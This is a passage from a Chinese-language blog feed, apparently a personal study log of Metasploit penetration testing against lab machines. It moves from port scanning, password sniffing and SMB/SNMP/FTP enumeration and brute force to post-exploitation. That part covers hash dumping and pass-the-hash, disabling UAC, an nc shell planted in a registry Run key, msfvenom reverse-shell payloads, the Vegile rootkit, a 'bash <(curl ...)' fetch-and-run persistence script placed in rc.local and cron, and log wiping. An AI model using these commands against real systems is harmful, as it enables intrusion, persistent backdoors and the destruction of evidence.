class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search portscan</span><br><span class="line">msf6 &gt; use auxiliary/scanner/portscan/syn</span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; set PORTS 80</span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; set RHOSTS 192.168.3.1/24</span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; set THREADS 20</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf2.png" alt="配置选项"></p><p>扫描结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; run</span><br><span class="line">[+]  TCP OPEN 192.168.3.1:80</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><h2 id="使用-auxiliary-sniffer-下的-psnuffle-模块进行密码嗅探"><a href="#使用-auxiliary-sniffer-下的-psnuffle-模块进行密码嗅探" class="headerlink" title="使用 auxiliary sniffer 下的 psnuffle 模块进行密码嗅探"></a>使用 auxiliary sniffer 下的 psnuffle 模块进行密码嗅探</h2><p>这个 psnuffle 模块 可以像以前的 dsniff 命令一样，去嗅探密码， 只支持 pop3，imap，ftp，HTTP GET 协议 。</p><p>扩展：Dsniff 是一个著名的网络嗅探工具包、高级口令嗅探工具、综合性的网络嗅探工具包。</p><p>msf6 &gt; use auxiliary/sniffer/psnuffle</p><p>run</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf3.png" alt="结果"></p><p>shift + ctrl + t 建立新终端 登录ftp</p><p>安装ftp apt install lftp -y</p><p>lftp -u msfadmin 192.168.3.27 # 27为metasploitable2-Linux靶机的ip</p><p>密码 msfadmin</p><p>ls</p><p>回到msf发现信息已经拿到</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf4.png" alt="结果"></p><p>关闭后台</p><p>jobs</p><p>kill 0</p><p><code>？这不是我已经输过账号和密码了吗</code></p><h1 id="基于SNMP协议收集主机信息"><a href="#基于SNMP协议收集主机信息" class="headerlink" title="基于SNMP协议收集主机信息"></a>基于SNMP协议收集主机信息</h1><p><code>简单网络管理协议</code>(SNMP Simple Network Management Protocol )，由一组网络管理的标准组成，包含一个应用层协议（ application layer protocol ）、数据库</p><p>模型 database schema ）和一组资源对象。该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况。</p><p>在典型的SNMP用法中，有许多系统被管理，而且是有一或多个系统在管理它们。每一个被管理的系统上有运行一个叫做代理者（agent）的软件组件，且透SNMP</p><p>对管理系统报告信息。</p><p><strong>将kali设为代理者 靶机向kali发送信息</strong></p><p>我们使用root 用户先到 Metasploitable2 Linux 主机上修改一下 SNMP 服务，因为默认服务是不对外开放的。</p><p><code>msfadmin@metasploitable:~vim /etc/default/snmpd</code></p><p>改第11 行</p><p><code>SNMPDOPTS=&#39;Lsd Lf /dev/null u snmp I smux p /var/run/snmpd.pid 0.0.0.0</code></p><p>保存退出</p><p>重启SNMP 服务</p><p><code>msfadmin@metasploitable:~$ sudo /etc/init.d/snmpd restart</code></p><p>确认服务监听正常</p><p><code>msfadmin@metasploitable:~$ netstat antup grep 161</code></p><h3 id="使用-snmp-enum-模块通过-snmp-协议扫描目标服务器信息"><a href="#使用-snmp-enum-模块通过-snmp-协议扫描目标服务器信息" class="headerlink" title="使用 snmp_enum 模块通过 snmp 协议扫描目标服务器信息"></a>使用 snmp_enum 模块通过 snmp 协议扫描目标服务器信息</h3><blockquote><p>msf6 &gt;use auxiliary/scanner/snmp/snmp_enum<br>msf6 &gt; auxiliary(scanner/snmp/snmp_enum) &gt; show options<br>msf6 &gt;auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 192.168.3.27<br>msf6 &gt;auxiliary(scanner/snmp/snmp_enum) &gt; run</p></blockquote><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf5.png" alt="结果"></p><p>可以看到snmp探测到东西很多，但服务器硬件和运行的进程信息是其他扫描方式，该协议获取不到的</p><h1 id="基于SMB协议收集信息"><a href="#基于SMB协议收集信息" class="headerlink" title="基于SMB协议收集信息"></a>基于SMB协议收集信息</h1><p><strong>服务器消息块</strong>（Server Message Block，缩写为SMB），又称<strong>网络文件共享系统</strong>（Common Internet File System，缩写为CIFS），一种应用层网络传输协议，由微软开发，主要功能是使网络上的机器能够共享计算机文件，打印机，串行端口和通讯等资源。它也提供经认证的进程间通信机能。它主要用在装有Microsoft Windows的机器上，在这样的机器上被称为Microsoft Windows Network。</p><p>经过Unix 服务器厂商重新开发后，它可以用于连接 Unix 服务器和 Windows 客户机，执行打印和文件共享等任务。</p><h2 id="使用-smb-enumshares-基于-SMB-协议扫共享文件（账号、密码）"><a href="#使用-smb-enumshares-基于-SMB-协议扫共享文件（账号、密码）" class="headerlink" title="使用 smb_enumshares 基于 SMB 协议扫共享文件（账号、密码）"></a>使用 smb_enumshares 基于 SMB 协议扫共享文件（账号、密码）</h2><p>SMB 的模块中基本上都是可以配置用户名和密码的，配置了用户名和密码某些模块扫描的结果会更满足我们的需求 。</p><p>新建文件夹设置共享</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf7.png" alt="共享信息"></p><p>添加admin信息获取密码(这是我设置的密码是123456)</p><p><code>msf6 &gt; use auxiliary/scanner/smb/smb_enumshares</code></p><p><code>msf6 auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 192.168.3.28</code><br>RHOSTS =&gt; 192.168.3.28<br><code>msf6 auxiliary(scanner/smb/smb_enumshares) &gt; set SMBUSER admin</code><br>SMBUSER =&gt; admin<br><code>msf6 auxiliary(scanner/smb/smb_enumshares) &gt; set SMBPASS 123456</code><br>SMBPASS =&gt; 123456</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf6.png" alt="run"></p><p>共享文件目录除了SMB还有 4 个是隐藏的共享目录。</p><h2 id="使用-smb-lookupsid-扫描系统用户信息-SID枚举"><a href="#使用-smb-lookupsid-扫描系统用户信息-SID枚举" class="headerlink" title="使用 smb_lookupsid 扫描系统用户信息(SID枚举)"></a>使用 smb_lookupsid 扫描系统用户信息(SID枚举)</h2><p>新建一个用户phantom 123456</p><p>SID 是 Windows 中每一个用户的ID，更改用户名SID也是不会改变的。</p><p>msf6 &gt; use auxiliary/scanner/smb/smb_lookupsid<br>msf6 auxiliary(scanner/smb/smb_lookupsid) &gt; set RHOSTS 192.168.3.33 #win7的地址<br>RHOSTS =&gt; 192.168.3.33<br>msf6 auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBUSER admin<br>SMBUSER =&gt; admin<br>msf6 auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBPASS 123456<br>SMBPASS =&gt; 123456<br>msf6 auxiliary(scanner/smb/smb_lookupsid) &gt; run</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf8.png" alt="run"></p><h2 id="使用-smb-version-基于-SMB-协议扫描版本号"><a href="#使用-smb-version-基于-SMB-协议扫描版本号" class="headerlink" title="使用 smb_version 基于 SMB 协议扫描版本号"></a>使用 smb_version 基于 SMB 协议扫描版本号</h2><p>use auxiliary/scanner/smb/smb_version设置</p><p>set RHOSTS 192.168.3.28, 192.168.3.23</p><p>run</p><p>可以扫描到本机的详细信息，操作系统的版本号(本机信息就不放截图了)</p><h1 id="基于SSH协议收集信息"><a href="#基于SSH协议收集信息" class="headerlink" title="基于SSH协议收集信息"></a>基于SSH协议收集信息</h1><h2 id="查看-ssh-服务的版本信息"><a href="#查看-ssh-服务的版本信息" class="headerlink" title="查看 ssh 服务的版本信息"></a>查看 ssh 服务的版本信息</h2><p>root@kali:~# echo “msfadmin msfadmin” &gt;&gt; /usr/share/metasploit-framework/data/wordlists/root_userpass.txt </p><p>msf6 &gt; use auxiliary/scanner/ssh/ssh_version</p><p>msf6 auxiliary(scanner/ssh/ssh_version) &gt; set RHOSTS 192.168.3.27<br>RHOSTS =&gt; 192.168.3.27<br>msf6 auxiliary(scanner/ssh/ssh_version) &gt; set USERPASS_FiLE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt<br>USERPASS_FiLE =&gt; /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</p><p>run</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf/msf9.png" alt="run"></p><h1 id="基于FTP协议收集信息"><a href="#基于FTP协议收集信息" class="headerlink" title="基于FTP协议收集信息"></a>基于FTP协议收集信息</h1><h2 id="查看-ftp-服务的版本信息"><a href="#查看-ftp-服务的版本信息" class="headerlink" title="查看 ftp 服务的版本信息"></a>查看 ftp 服务的版本信息</h2><p>msf6 &gt; use auxiliary/scanner/ftp/ftp_version<br>msf6 auxiliary(scanner/ftp/ftp_version) &gt; set RHOSTS 192.168.3.27<br>RHOSTS =&gt; 192.168.3.27<br>msf6 auxiliary(scanner/ftp/ftp_version) &gt; run</p><p>[+] 192.168.3.27:21       - FTP Banner: ‘220 (vsFTPd 2.3.4)\x0d\x0a’<br>[*] 192.168.3.27:21       - Scanned 1 of 1 hosts (100% complete)<br>[*] Auxiliary module execution completed</p><p>可以看到FTP版本为2.3.4</p><p>search ftp</p><p>use exploit/unix/ftp/vsftpd_234_backdoor</p><p>set 192.168.3.27</p><p>run获得root权限</p><p><code>id</code><br><code>uid=0(root) gid=0(root)</code></p><h2 id="2-ftp匿名登录扫描"><a href="#2-ftp匿名登录扫描" class="headerlink" title="2.ftp匿名登录扫描"></a>2.ftp匿名登录扫描</h2><p>msf6 &gt; use auxiliary/scanner/ftp/anonymous<br>msf6 auxiliary(scanner/ftp/anonymous) &gt; set RHOSTS 192.168.3.27<br>RHOSTS =&gt; 192.168.3.27<br>msf6 auxiliary(scanner/ftp/anonymous) &gt; run</p><p>[+] 192.168.3.27:21       - 192.168.3.27:21 - Anonymous READ (220 (vsFTPd 2.3.4))<br>[*] 192.168.3.27:21       - Scanned 1 of 1 hosts (100% complete)<br>[*] Auxiliary module execution completed</p><h2 id="3-ftp暴力破解"><a href="#3-ftp暴力破解" class="headerlink" title="3.ftp暴力破解"></a>3.ftp暴力破解</h2><p>use auxiliary/scanner/ftp/ftp_login</p><p>set RHOSTS 192.168.3.27</p><p>set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</p><p>run前面的都是错的</p><p>[+] 192.168.3.27:21       - 192.168.3.27:21 - Login Successful: msfadmin:msfadmin<br>[*] 192.168.3.27:21       - Scanned 1 of 1 hosts (100% complete)<br>[*] Auxiliary module execution completed</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali，msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Metasploit隐藏后门</title>
      <link href="/2021/07/17/Linux%E5%AD%A6%E4%B9%A0/kali/msf%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/"/>
      <url>/2021/07/17/Linux%E5%AD%A6%E4%B9%A0/kali/msf%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="1-创建一个新用户来远程连接-win7-桌面"><a href="#1-创建一个新用户来远程连接-win7-桌面" class="headerlink" title="1.创建一个新用户来远程连接 win7 桌面"></a>1.创建一个新用户来远程连接 win7 桌面</h2><p>RDP概述：远程桌面协议（ RDP, Remote Desktop Protocol ）是一个多通道 multi channel的协议，让用户（客户端或称“本地电脑”）连上提供微软终端机服务的电脑（服务器端或称“远程电脑”）。</p><h3 id="1-1使用enable-rdp脚本开启远程桌面并创建用户"><a href="#1-1使用enable-rdp脚本开启远程桌面并创建用户" class="headerlink" title="1.1使用enable_rdp脚本开启远程桌面并创建用户"></a>1.1使用enable_rdp脚本开启远程桌面并创建用户</h3><p>meterpreter &gt; run post/windows/manage/enable_rdp</p><p>meterpreter &gt; run post/windows/manage/enable_rdp USERNAME=phantom PASSWORD=123456</p><p>开一个新的终端</p><p>root@kali:~# rdesktop 192.168.3.33</p><p>登录账号 phantom 123456</p><h2 id="1-2-关闭主机防护策略并开启后门"><a href="#1-2-关闭主机防护策略并开启后门" class="headerlink" title="1.2.关闭主机防护策略并开启后门"></a>1.2.关闭主机防护策略并开启后门</h2><p>通过ms 17 010 永恒之蓝获取到的 shell 可能会出现操作受限的情况，所以我们使用主机的账户信息建立 session 进行连接。</p><p>Windows System32 config SAM</p><p>我们创建一条防火墙规则允许4444 端口访问网络，否则我们建立 session 时 payload 不能通过4444 端口访问网络导致 session 建立失败。</p><p>netsh firewall add portopening TCP 4444 “phantom” ENABLE ALL</p><p>账号的hash值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">admin:1003:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"><span class="meta">HomeGroupUser$</span><span class="bash">:1002:aad3b435b51404eeaad3b435b51404ee:381c848b3c04bb3cb5eb508e52e39d8c:::</span></span><br><span class="line">phantom:1005:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br><span class="line">win7 x64:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure><p>C:\Windows\system32&gt;cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\windows\Currentversion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\windows\Currentversion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f<br>The operation completed successfully.</p><p>参数说明<br>ADD添加一个注册表项<br>-v 创建键值<br>-t 键值类型<br>-d 键值的值<br>-f 强制修改注册表项</p><p>开启 win7 系统主机的默认共享， 默认共享对 Windows 主机的文件共享非常方便，也方便黑客利用这个功能，远程执行命令。<br>C:Windows system32&gt; cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</p><p><strong>注：</strong>psexec 实用程序在远程系统上需要做一些事情：服务器消息块（ SMB ）服务必须可用并且可以访问（例如，未被防火墙阻止）；必须启用文件和打印共享。 Admin$ 共享必须可用并且可以访问。它是一个隐藏的 SMB 共 享， 它映射到 Windows 目录，用于软件部署。提供给 psexec 实用程序的凭据必须具有访问 Admin$ 共享的权限。 psexec 的可执行文件内有 Windows 服务映像。它接受此服务并将其部署到远程计算机上的Admin$ 共享中。然后，它使用 SMB 上的 DCE/RPC 分布式计算环境 远程过程调用 ）接口来访问 W indows Service Control Manager API 。它将打开远程计算机上的 psexec服务。然后 psexec 服务创建一个可用于将命令发送到系统的命名管道。</p><h1 id="注：提权-绕过UAC"><a href="#注：提权-绕过UAC" class="headerlink" title="注：提权 绕过UAC"></a>注：提权 绕过UAC</h1><p>当我们得到一个目标主机返回的shell后，我们第一步要看的是当前用户是不是管理员权限，如果不是管理员权限，这个时候需要我们去提权。我们可以利用kaili中的本地提权的方式，下面介绍一下本地提权绕过UAC的方式提升当前用户权限，以下是详细的命令以及步骤：</p><p><strong>什么是UAC</strong></p><p>Microsoft的Windows Vista和Windows Server 2008操作系统引入了一种良好的用户帐户控制架构，以防止系统范围内的意外更改，这种更改是可以预见的，并且只需要很少的操作量。它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows系统保持不变。</p><p><strong>UAC如何运行</strong></p><p>UAC通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被“提升权限”，而不是以管理员身份运行的程序。</p><p>因为有的用户是没有管理员权限，没有管理员权限是运行不了哪些只能通过管理员权限才能操作的命令。比如修改注册表信息、创建用户、读取管理员账户密码、设置计划任务添加到开机启动项等操作。</p><p>最直接的就是 getsystem</p><p>绕过UAC防护机制的前提是我们首先通过explloit获得目标主机的meterprter</p><p>执行完毕成功后，再次查询当前用户的权限就会提升到管理员权限 getuid</p><h3 id="1-进程注入"><a href="#1-进程注入" class="headerlink" title="1.进程注入"></a>1.进程注入</h3><p>use exploit/windows/local/bypassuac</p><h3 id="2-内存注入"><a href="#2-内存注入" class="headerlink" title="2.内存注入"></a>2.内存注入</h3><p>此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload 二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。执行完毕以下命令，当前用户权限就会变为管理员权限</p><p>use exploit/windows/local/bypassuac_fodhelper</p><h3 id="3-通过COM处理程序劫持"><a href="#3-通过COM处理程序劫持" class="headerlink" title="3.通过COM处理程序劫持"></a>3.通过COM处理程序劫持</h3><p>COM处理程序劫持，此模块将通过在<strong>hkcu配置单元中创建COM处理程序注册表</strong>项来绕过Windows UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL包含导致会话权限提升的payload。此模块修改注册表项，但在调用payload后将清除该项。这个模块需要payload的体系架构和操作系统匹配，但是当前的低权限meterpreter会话体系架构中可能不同。如果指定exe:：custom，则应在单独的进程中启动payloa后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件。因此，如果cmd.exe访问受到限制，此模块将无法正常运行。</p><p>use exploit/windows/local/bypassuac_comhijack</p><h3 id="4-通过Eventvwr注册表项"><a href="#4-通过Eventvwr注册表项" class="headerlink" title="4.通过Eventvwr注册表项"></a>4.通过Eventvwr注册表项</h3><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（）</p><p>use exploit/windows/local/bypassuac_eventvwr</p><p>以上的本地提权的模块大家可以本地去测试一下，除了这些某块还有其它的通过直接通过incognito中的add_localgroup_user提升、ms13-081、ms15-051、ms16-032、MS16-016、MS14-068、ms18_8120_win32k_privesc域权限提升等其它的权限提升方法</p><h2 id="1-3-使用-hash-值登录系统"><a href="#1-3-使用-hash-值登录系统" class="headerlink" title="1.3.使用 hash 值登录系统"></a>1.3.使用 hash 值登录系统</h2><hr><p>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <code>use exploit/windows/smb/psexec</code><br>[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp<br>msf6 exploit(windows/smb/psexec) &gt; <code>set payload windows/meterpreter/reverse_tcp</code></p><p>msf6 exploit(windows/smb/psexec) &gt; <code>set RHOSTS 192.168.3.28</code></p><p>msf6 exploit(windows/smb/psexec) &gt; <code>set SMBUSER phantom</code></p><p>msf6 exploit(windows/smb/psexec) &gt; <code>set SMBPASS aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</code></p><p>msf6 exploit(windows/smb/psexec) &gt;<code> set SMBDOMAIN WORKGROUP</code><br>SMBDOMAIN =&gt; WORKGROUP<br>msf6 exploit(windows/smb/psexec) &gt; <code>exploit</code></p><hr><p>我们用phantom获取了system的权限</p><p><code>getuid</code></p><p><code>Server username: NT AUTHORITY\SYSTEM</code></p><p>下面我们配置一个后门程序，修改UAC 的注册表，需要重启才能生效。<br>上传nc 到 Win 7<br><code>meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\windows</code></p><p>注册表添加启动项执行<br><strong>nc 反弹 shell 命令</strong><br><code>meterpreter &gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#39;C:\windows\nc.exe -Ldp 443 -e cmd.exe&#39;</code><br><code>Successfully set lltest_nc of REG_SZ.</code><br>nc 参数解释：<br>-L表示用户退出连接后重新进行端口侦听<br>-d后台运行<br>-p指定端口<br>-e prog 程序重定向，一旦连接，就执行<br>meterpreter &gt; shell</p><p><code>C:\Windows\system32&gt;netsh firewall add portopening TCP 443 &quot;phantom&quot; ENABLE ALL</code></p><p>shutdown -r -f -t 0</p><p>-r 重启</p><p>-f 强制</p><p>-t 时间 0 表示立刻</p><p><strong>后门已经插入 用nc 连接或者msf</strong></p><p>nc -v 192.168.3.28 443</p><p>msf6 &gt; connect 192.168.3.28 443</p><p>还可以上传木马并执行</p><h1 id="3-Linux无文件木马程序"><a href="#3-Linux无文件木马程序" class="headerlink" title="3.Linux无文件木马程序"></a>3.Linux无文件木马程序</h1><p><code>准备 </code></p><p>Ubuntu：192.168.3.26</p><p>kali: 192.168.3.24</p><p>root@kali:~# msfvenom -a x64 –platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.3.24 LPORT=8080 -b “\x00” -f elf -o /var/www/html/backdoor</p><p>msfvenom -a x64 –platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.3.24 LPORT=4444 -b “\x00” -f elf -o /var/www/html/ghost</p><p>启动apache<br>systemctl start apache2</p><p>systemctl enable apache2 开机自启</p><p>Vegile<br>是用于 linux 系统渗透测试中的权限维持。 Vegile 这个工具将设置一个后门 /rootkit ，并且<br>这个后门会直接隐藏进程，无限连接 metesploit, 持续维持你的 Metepreter 会话，即使木马进程被杀<br>死，它依然会再次重新运行，换句话说是该进程无限循环的。</p><p>使用注意事项：<br>木马一定要放在Vegile 目录下<br>Vegile一般用于维持 meterpreter 会话；</p><blockquote><p>use exploit/multi/handler<br>exploit(multi/handler) &gt; set payload linux/x64/shell/reverse_tcp<br>exploit(multi/handler) &gt; set LHOST 192.168.3.24<br>exploit(multi/ha ndler) &gt; set LPORT 8080 改一下端口，防止和上面实验的 4444 端端口冲突</p><p>exploit(multi/ha ndler) &gt;  exploit -j</p></blockquote><p>到Ubuntu下建立连接</p><p>将Vegile 和backdoor传入</p><p>wget 192.168.3.24/backdoor</p><p>chmod +x backdoor</p><p>chmod +x Vegile</p><p>./backdoor</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msfm.png"></p><p> netstat -antup | grep 8080</p><p>ps -aux | grep 4495</p><p>ifconfig</p><p>/usr/sbin/ifconfig</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf1/m2.png"></p><h2 id="3-2-创建无文件后门程序"><a href="#3-2-创建无文件后门程序" class="headerlink" title="3.2 创建无文件后门程序"></a>3.2 创建无文件后门程序</h2><blockquote><p>use exploit/multi/handler<br>exploit(multi/handler) &gt; set payload linux/x64/shell/reverse_tcp<br>exploit(multi/handler) &gt; set LHOST 192.168.3.24<br>exploit(multi/handler) &gt; set LPORT 4444<br>exploit(multi/handler) &gt; exploit -j</p></blockquote><p>在kali上操控Ubuntu</p><p>wget 192.168.3.24/ghost</p><p>chmod +x ghost</p><p>./Vegile –i ghost</p><p>查看已成功</p><p>sessions 查看端口为37884</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/msf1/m3.png"></p><p>rm -rf /root/Vegile master</p><p>删除时会把后门给删掉，但通话还建立，程序照常运行</p><p><code>./Velige --u 无限复制metasploit会话，即使kill 任然可以运行</code></p><p><code>./Velige --i ghost</code></p><h1 id="4-使用脚本来进行自动创建后门"><a href="#4-使用脚本来进行自动创建后门" class="headerlink" title="4.使用脚本来进行自动创建后门"></a>4.使用脚本来进行自动创建后门</h1><p><strong>建立个脚本</strong></p><p><code>vim script.sh</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 把前面下载 Vegile 到执行后门文件的命令使用 拼接成一条命令</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&amp;&amp; 表示前面的命令执行成功则执行下一条命令</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> y | 表示将 y 作为 Vegile 命令的输入，因为执行 Vegile 命令是需要我们按任意键退出，所以我们手动输入一个字符让程序执行完成后自动退出。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&gt;&gt; /dev/null 2&gt;&amp;1 不显示所有输出结果。</span></span><br><span class="line">wget 192.168.3.24/Vegile-master.zip &amp;&amp; unzip Vegile-master.zip &amp;&amp; cd Vegile master &amp;&amp; chmod +x Vegile &amp;&amp; wget 192.168.3.24/ghost &amp;&amp; chmod +x ghost &amp;&amp; echo -y | ./Vegile --i ghost &gt;&gt; /dev/null 2&gt;&amp;1</span><br><span class="line"><span class="meta">#</span><span class="bash">删除下载的所有文件</span></span><br><span class="line">rm -rf /tmp/Vegile master.zip /tmp/Vegile master</span><br><span class="line"><span class="meta">2&gt;</span><span class="bash">&amp;1的意思就是将标准错误重定向到标准输出。这里标准输出已经重定向到了/dev/null 。那么</span></span><br><span class="line">标准错误也会输出到 /dev/null 。 /dev/null 可以看作黑洞. 它等价于一个只写文件.所有写入它的内容都会永远丢失.而尝试从它那儿读取内容则什么也读不到</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先我们先清空后台任务和前面已经建立的session<br>msf6 exploit(multi/handler) &gt; jobs -K<br>msf6 exploit(multi/handler) &gt; sessions -K<br>msf6 exploit(multi/handler) &gt; exploit -j</p><blockquote><p>bash &lt;(curl -s -L <a href="http://192.168.3.24/script.sh">http://192.168.3.24/script.sh</a>) &gt;&gt; /dev/null 2&gt;&amp;1</p></blockquote><hr><p>说明：<br>bash&lt;() 表示将括号中的内容通过 bash 来执行<br>curl -s -L #curl 是一个利用 URL 语法在命令行下进行文件传输的工具<br>-s –silent 表示静默模式不输出任何内容<br>-L 跟 http 连接，组合使用的效果是把 http 连接中的文件下载到内存中，然后传 bash ，进行执行。这样好处是：本地不会保存任何文件。</p><p>&gt;&gt;/dev/null 2&gt;&amp;1不输出任何信息</p><hr><p>sessions连接已建立</p><p>pwd</p><p>pwd: error retrieving current directory: getcwd: cannot access parent directories: No<br>such file or directory</p><p>提示目录不存在因为payload中的Velige目录已被删除</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root/</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h2 id="配置开机自启"><a href="#配置开机自启" class="headerlink" title="配置开机自启"></a>配置开机自启</h2><p>将命令添加到开机启动项</p><p>注： 在开机项加/etc/rc.local</p><p><code>root@Ububtu:~# echo &quot;bash &lt;(curl -s -L http://192.168.3.24/script.sh) &gt;&gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /etc/rc.local</code></p><p><code>chmod +x /etc/rc.local</code></p><p>reboot</p><p><strong>？上面的试了没用</strong></p><p>root@ubuntu:<del># mv /etc/rc.local /etc/init.d/<br>root@ubuntu:</del># cd /etc/init.d<br>root@ubuntu:/etc/init.d# su update-rc.d rc.local defaults 99</p><h2 id="配置计划任务"><a href="#配置计划任务" class="headerlink" title="配置计划任务"></a>配置计划任务</h2><p>ll /etc/crontab</p><p>这是系统任务调度文件</p><p>vim /etc/crontab</p><p>SHELL=/bin/bash</p><p>PATH=/sbin:/bin:/usr/sbin:/usr/bin #系统搜索路径</p><p>MAILTO=root</p><p># * * * * * user</p><p>name command to be executed<br>0 */1 * * * root bash &lt;(curl s L <a href="http://192.168.1.53/xuegod.sh">http://192.168.1.53/xuegod.sh</a>) &gt;&gt; /dev/null 2&gt;&amp;1</p><h1 id="系统日志清理"><a href="#系统日志清理" class="headerlink" title="系统日志清理"></a>系统日志清理</h1><h2 id="Windows-日志清理"><a href="#Windows-日志清理" class="headerlink" title="Windows 日志清理"></a>Windows 日志清理</h2><p>Win+R 运行： eventvwr</p><p>正常的远程访问在 windows 的时间查看器中可以看到相关记录</p><p>meterpreter &gt; clearev</p><p>删除系统日志目录下的一些日志文件。<br>meterpreter &gt; shell<br>C:\Windows system32&gt;del %WINDIR% WINDIR%\*.log /a/s/q/f</p><h2 id="Linux-日志清理"><a href="#Linux-日志清理" class="headerlink" title="Linux 日志清理"></a>Linux 日志清理</h2><p>Linux<br>可能根据发行版本不同，日志文件名称也有所不同。所以具体清除需要大家先看一下目标操作<br>系统。<br>清理历史命令<br>history -c<br>使系统不再保存历史命令<br>vi /etc/profile，找到 HISTSIZE 这个值，修改为 0<br>删除访问日志</p><p><strong>访问失败的日志</strong></p><p>删除登录失败记录：echo &gt; 